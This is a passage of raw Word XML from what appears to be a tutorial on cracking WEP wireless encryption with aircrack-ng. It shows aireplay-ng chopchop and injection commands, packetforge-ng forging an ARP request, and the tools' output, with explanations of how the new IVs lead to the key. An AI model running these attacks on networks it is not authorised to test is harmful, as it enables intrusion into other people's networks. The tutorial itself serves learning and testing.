          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -4 -h 00:09:5B:EC:EE:F2 -b 00:14:6C:7E:40:80 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C678AEB" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00F37B2B" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B494C7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160724B6"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-4 means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attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B18056D"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5394FFFC"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162D5B23"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650E197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responds:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F3DC9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Read 165 packets...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E61ADE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45A0B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Size: 86,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7D6E92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5EDB90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5BE1283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FF:FF:FF:FF:FF:FF</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="67D10040"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5803868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A4C6C0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0x0000:  0842 0000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0014 6c7e 4080  .B..........l~@.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D99FA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0x0010:  0040 f477 e5c9 603a d600 0000 5fed </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>a222  .@.w</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37CF030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0x0020:  e2ee aa48 8312 f59d c8c0 af5f 3dd8 a543  ...H</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_=..C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB47F0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0x0030:  d1ca 0c9b 6aeb fad6 f394 2591 5bf4 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>2873  ....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>j.....%.[.(s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76795600"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0x0040:  16d4 43fb </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>aebb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3ea1 7101 729e 65ca </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>6905  ..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>C...&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>q.r.e.i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E53BE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0x0050:  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>cfeb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4a72 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>be46                           ..</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Jr.F</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2037069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7A03F517"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04DE5C55" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="0038547B" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>You respond “y” above and the system continues.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6188EEC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chosen packet in replay_src-0201-191639.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3D80EA"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B87806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85 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>( 0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">%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D3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95 |  253 frames written in   760ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3856B34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Offset   46 (75%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51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F4 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>|  253</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> frames </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7127C6C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roofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>written</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> in   695ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E01143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36 (94%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83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00 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>|   19</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> frames written in    58ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A72232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35 (96%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4E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06 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>|  230</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> frames written in   689ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BA80F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Sent 957 packets, current guess: B9...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F1F3EC"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0527722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The AP appears to drop packets shorter than 35 bytes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5552748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Enabling standard workaround: ARP header re-creation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574DCB7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5E828AC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plaintext in replay_dec-0201-191706.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5114227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replay_dec-0201-191706.xor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7AB4A1"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5A703AF6"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Completed in 21s (2.29 bytes/s)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E92CB3B" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00204ED2" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Success! The file “replay_dec-0201-191706.xor” above can then be used in the next step to generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008B6470" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E98D388"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packetforge-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to create an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47F8071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the previous step, we obtained PRGA. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>It does not matter which attack generated the PRGA</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>both are equal</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. This PRGA is stored in the files ending with “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">”. We can then use this PRGA to generate a packet for injection. We will be generating an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The objective is to have the access point rebroadcast the injected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When it rebroadcasts it, a new IV is obtained. All these new IVs will ultimately be used to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1135A88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But first, lets generate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by entering:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528FC180"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FFF1FA4"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packetforge</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-0 -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor -w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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296DD61C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75BBA9A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B67DEA2"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means generate an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1AD4AF9E"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6C61EDCD"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MAC address of our card</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03ECD487"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k</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 255.255.255.255 is the destination IP (most APs respond to 255.255.255.255)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA1E6AE"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l</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 255.255.255.255 is the source IP (most APs respond to 255.255.255.255)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711B7E6B"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y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> fragment-0203-180343.xor is file to read the PRGA from (NOTE: Change the file name to the actual file name out in step 4 above)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CDCD93"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is name of file to write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 to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6054603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1FFCC3DA" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EF244CF"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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Wrote packet to: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F467F08" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E843AD5"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5 - Start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="31D1F0FF"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5E17249A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38E40A1A"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1F645F57" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68AA428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66C81308"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248F04C2"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1DB63AB4"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captured packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F6D604" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="001F4FDF"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interface name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027D545D" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D1A1F79"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6 - Inject the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0E36147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Using the console session where you generated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enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BBBE9DA" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03073B1F"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r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w: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-2 -r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 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4773CF74" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="003112DC" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40EA820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F8A9B02"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0369877A"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r</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defines the file name from which to read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027F0E98"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5F5F845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6E6483AD"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Size: 68, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: 0, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ToDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 1 (WEP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211C69AD"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5A0EE5F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BSSID  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
